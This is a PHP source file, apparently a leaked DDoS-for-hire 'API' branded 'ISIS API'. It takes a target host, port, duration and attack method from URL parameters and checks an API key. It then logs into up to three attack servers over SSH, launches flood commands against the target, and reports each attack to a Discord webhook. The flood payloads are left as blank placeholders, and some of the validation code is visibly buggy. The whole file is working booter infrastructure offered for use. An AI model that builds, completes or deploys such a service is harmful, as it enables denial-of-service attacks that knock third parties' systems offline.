<?php
/////////////////////////////////
//- API Script - Leaked by P6 -//
/////////////////////////////////
//Doom
ignore_user_abort(true);
set_time_limit(1200);
date_default_timezone_set("America/New_York");

//sleep (3);
/*/
function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        } else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'];
}
function validate_ip($ip)
{
    if (strtolower($ip) === 'unknown')
        return false;
    $ip = ip2long($ip);
    if ($ip !== false && $ip !== -1) {
        $ip = sprintf('%u', $ip);
        if ($ip >= 0 && $ip <= 50331647)
            return false;
        if ($ip >= 167772160 && $ip <= 184549375)
            return false;
        if ($ip >= 2130706432 && $ip <= 2147483647)
            return false;
        if ($ip >= 2851995648 && $ip <= 2852061183)
            return false;
        if ($ip >= 2886729728 && $ip <= 2887778303)
            return false;
        if ($ip >= 3221225984 && $ip <= 3221226239)
            return false;
        if ($ip >= 3232235520 && $ip <= 3232301055)
            return false;
        if ($ip >= 4294967040)
            return false;
    }
    return true;// Blacklisted ips
}
/*/
$var = 'Attack Sent To 1 Server Successfully!';
//$disc = 'New Discord: '

?>
<div class="section">
        <div class="video-container">
            <div class="color-overlay"></div>
            <audio controls volume="2" volume=id="web_audio" controls autoplay hidden="hidden">
            <source src="audio/clutch.mp3" type="audio/mpeg">
            </audio>
        </div>
<!DOCTYPE html>
<html>
<head>

<title>ISIS API - APIv1</title>
    <meta charset="utf-8">
    <title>Rainbow Gradient Text Animation</title>
  </head>
  <body>
    <div class="center">
      <h1>ISIS API - Attack Initalized</h1>
      <li>IG : @x86.root</li>
      <?php echo $var //display some PHP here?>
      <br>
            <?php echo $disc //display some PHP here?> 
    </div>
  </body>
</html>
<style>
body {
  background-color: #244323;
  color: white;
</style>
<style>
    .snowflake {
        color: #fff;
        font-size: 1em;
        font-family: Arial, sans-serif;
        text-shadow: 0 0 5px #000;
    }
    
    @-webkit-keyframes snowflakes-fall {
        0% {
            top: -10%
        }
        100% {
            top: 100%
        }
    }
    
    @-webkit-keyframes snowflakes-shake {
        0%,
        100% {
            -webkit-transform: translateX(0);
            transform: translateX(0)
        }
        50% {
            -webkit-transform: translateX(80px);
            transform: translateX(80px)
        }
    }
    
    @keyframes snowflakes-fall {
        0% {
            top: -10%
        }
        100% {
            top: 100%
        }
    }
    
    @keyframes snowflakes-shake {
        0%,
        100% {
            transform: translateX(0)
        }
        50% {
            transform: translateX(80px)
        }
    }
    
    .snowflake {
        position: fixed;
        top: -10%;
        z-index: 9999;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        cursor: default;
        -webkit-animation-name: snowflakes-fall, snowflakes-shake;
        -webkit-animation-duration: 10s, 3s;
        -webkit-animation-timing-function: linear, ease-in-out;
        -webkit-animation-iteration-count: infinite, infinite;
        -webkit-animation-play-state: running, running;
        animation-name: snowflakes-fall, snowflakes-shake;
        animation-duration: 10s, 3s;
        animation-timing-function: linear, ease-in-out;
        animation-iteration-count: infinite, infinite;
        animation-play-state: running, running
    }
    
    .snowflake:nth-of-type(0) {
        left: 1%;
        -webkit-animation-delay: 0s, 0s;
        animation-delay: 0s, 0s
    }
    
    .snowflake:nth-of-type(1) {
        left: 10%;
        -webkit-animation-delay: 1s, 1s;
        animation-delay: 1s, 1s
    }
    
    .snowflake:nth-of-type(2) {
        left: 20%;
        -webkit-animation-delay: 6s, .5s;
        animation-delay: 6s, .5s
    }
    
    .snowflake:nth-of-type(3) {
        left: 30%;
        -webkit-animation-delay: 4s, 2s;
        animation-delay: 4s, 2s
    }
    
    .snowflake:nth-of-type(4) {
        left: 40%;
        -webkit-animation-delay: 2s, 2s;
        animation-delay: 2s, 2s
    }
    
    .snowflake:nth-of-type(5) {
        left: 50%;
        -webkit-animation-delay: 8s, 3s;
        animation-delay: 8s, 3s
    }
    
    .snowflake:nth-of-type(6) {
        left: 60%;
        -webkit-animation-delay: 6s, 2s;
        animation-delay: 6s, 2s
    }
    
    .snowflake:nth-of-type(7) {
        left: 70%;
        -webkit-animation-delay: 2.5s, 1s;
        animation-delay: 2.5s, 1s
    }
    
    .snowflake:nth-of-type(8) {
        left: 80%;
        -webkit-animation-delay: 1s, 0s;
        animation-delay: 1s, 0s
    }
    
    .snowflake:nth-of-type(9) {
        left: 90%;
        -webkit-animation-delay: 3s, 1.5s;
        animation-delay: 3s, 1.5s
    }
    
    .snowflake:nth-of-type(10) {
        left: 25%;
        -webkit-animation-delay: 2s, 0s;
        animation-delay: 2s, 0s
    }
    
    .snowflake:nth-of-type(11) {
        left: 65%;
        -webkit-animation-delay: 4s, 2.5s;
        animation-delay: 4s, 2.5s
    }
    .snowflake:nth-of-type(12) {
        left: 75%;
        -webkit-animation-delay: 4s, 2.5s;
        animation-delay: 4s, 2.5s
    }
</style>
<div class="snowflakes" aria-hidden="true">
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
<div class="snowflake">

</div>
</div>
<style>
    ::-webkit-scrollbar {
        width: 0px;
    }
    
    ::-webkit-scrollbar-track {
        background: transparent;
    }
    
    ::-webkit-scrollbar-thumb {
        background: transparent;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: transparent;
    }
</style>
</head>
</html>

<?php

//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$apis = [
    "1" =>[
        "ip"    => "",
   "username" => "",
   "password" => "",
    ],
    "2" =>[
        "ip"    => "",
   "username" => "",
   "password" => "",
    ],
    "3" =>[
        "ip"    => "",
   "username" => "",
   "password" => "",
    ]
];




/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$date    = date('h:i - d/m');
//$ip      = get_ip_address();

///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////

include 'g.php';

$array = array("", "",);// Add you're existing methods here, and delete you're none existent methods.

$blk = array("1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5", "6.6.6.6", "7.7.7.7", "8.8.8.8", "9.9.9.9");


////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}

//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}

if (in_array($host, $blk)){ //Change "key" to what ever yo want you're API key to be.
die('Warning: Host is Blacklisted!');}

/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}

/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}

///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}

///////////////////////////////////////////////
//-- List your bypasses here and a maxtime --//
///////////////////////////////////////////////
//if ($time > 3 || $method = $bps){
//die('Error: Maxtime for bypasses is 200!');}
if ($method == "NAME" && $time > 200){
die('Error: Maxtime for bypasses is 200!');}

///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 65535){
die('Error: Ports over 65535 do not exist');}

//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////
if ($time > 1200){
die('Error: Cannot exceed 1200 seconds, Upgrade your plan!');}

if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}

if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}

//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////

if ($method == "name") { $command = "screen -dm ./";; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
$i = 0;
foreach ($apis as $api) {
  $i++;
    if(!($con = ssh2_connect($api["ip"], 22))){

      array_push($OUTPUT, [
        "server" => $i,
        "status" => "CONECTION FAILED"
      ]);
        echo json_encode($OUTPUT);
      } else {
          if(!ssh2_auth_password($con, $api["username"], $api["password"])) {
            array_push($OUTPUT, [
              "server" => $i,
              "status" => "INCORECT SERVER LOGIN"
            ]);
          } else {
          
              if (!($stream = ssh2_exec($con, $command ))) {
                array_push($OUTPUT, [
                  "server" => $i,
                  "status" => "Error: You're server was not able to execute you're methods file and or its dependencies"
                ]);

              } else {    
              	array_push($OUTPUT, [
                    "server" => $i,
                    "status" => "<br>Success: Flooding $host Using $method For $time<br>"
                  ]);
                  stream_set_blocking($stream, false);
                  $data = "";
                  while ($buf = fread($stream,4096)) {
                      $data .= $buf;
                  }
                  fclose($stream);
              }
          }
      }
}
{
$url = "";
$hookObject = json_encode([
    "username" => "YourAPI",

    "avatar_url" => "",

    "tts" => false,

    "embeds" => [
        [
            "title" => "YourAPI",

            "type" => "rich",

            "description" => "DDoS API Request",
            "url" => "http://discord.gg/",

 
            "color" => hexdec( "fd0000" ),

            "footer" => [
                "text" => "Api Source Creater ->  | Api Owner -> ",
            ],

            "thumbnail" => [
                "url" => "https://cdn.discordapp.com/avatars/762056822973530134/a_91e4c38752e5bce3f7a5aecebe3a34eb.gif?size=256&f=.gif"
            ],



            "fields" => [
                [
                    "name" => "Logged IP: ",
                    "value" => "||||",
                    "inline" => false
                ],
                [
                    "name" => "Attack Sent At:",
                    "value" => "$date",
                    "inline" => true
                ],
                [
                    "name" => "Attack Sent To:",
                    "value" => "$host",
                    "inline" => true
                ],
                [
                    "name" => "Seconds:",
                    "value" => "$time",
                    "inline" => true
                ],
                [
                    "name" => "Port:",
                    "value" => "$port",
                    "inline" => true
                ],
                [
                    "name" => "Method:",
                    "value" => "$method",
                    "inline" => true
                ],
                [
                    "name" => "Using Key:",
                    "value" => "||$key||",
                    "inline" => true
                ],
                [
                    "name" => "Servers:",
                    "value" => "3/4",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
//echo "<p align=center>Attack Sent! Flooding: $host:$port for $time seconds with $method</p>";
curl_close( $ch );
}
?>